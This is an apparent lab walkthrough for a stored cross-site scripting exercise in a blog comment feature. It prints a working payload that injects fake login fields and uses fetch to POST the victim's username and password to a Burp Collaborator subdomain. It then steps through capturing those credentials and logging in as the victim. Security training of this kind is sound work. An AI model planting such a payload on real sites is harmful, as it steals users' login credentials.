# Lab 5: Exploiting cross-site scripting to capture passwords

## 📝 Lab Overview

This lab features a **stored cross-site scripting (XSS)** vulnerability in the blog comment function. A simulated victim user **automatically views** all posted comments, providing an opportunity to run a malicious script that captures their **login credentials**.

---

## ⚠️ Important Notes

- 🛡️ The lab platform **blocks outgoing requests** to arbitrary domains — use only **Burp Collaborator's default public server**.
- 💡 A **less subtle alternative** method involving CSRF exists, but it's discouraged due to evidence exposure.

---

## 🛠️ Solution Steps

### 🔗 1. Get Your Burp Collaborator Subdomain

- Open **Burp Suite Professional**
- Go to the **Collaborator** tab
- Click **"Copy to clipboard"** to copy your unique **subdomain**

---

### 💬 2. Submit the XSS Payload in a Blog Comment

Post the following **HTML+JS payload** in the blog comment field (replace `BURP-COLLABORATOR-SUBDOMAIN` with your actual subdomain):

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
});">

```

🧠 **How it works:**

- Adds fake login fields.
- When the victim types a password, the `onchange` event triggers.
- The credentials are **POSTed** silently to your Burp Collaborator subdomain.

---

### 📡 3. Capture the Credentials

- Go back to **Burp Collaborator**
- Click **"Poll now"**
- You should see an **HTTP interaction**
- Copy the **username and password** from the request `body`

---

### 🔐 4. Log In as the Victim

- Use the **captured credentials** to log in through the lab’s login form
- 🎯 If successful, the lab is **solved**

---

## 🚧 Alternative (Less Recommended)

You could modify the attack to use **CSRF** to publicly submit the victim's credentials in a comment.

⚠️ **Drawbacks:**

- Credentials are exposed in public
- Leaves **forensic evidence** of the attack

---

## 🎥 Community Solution

📺 [Watch on YouTube](https://youtu.be/I6TOtXSOZ90)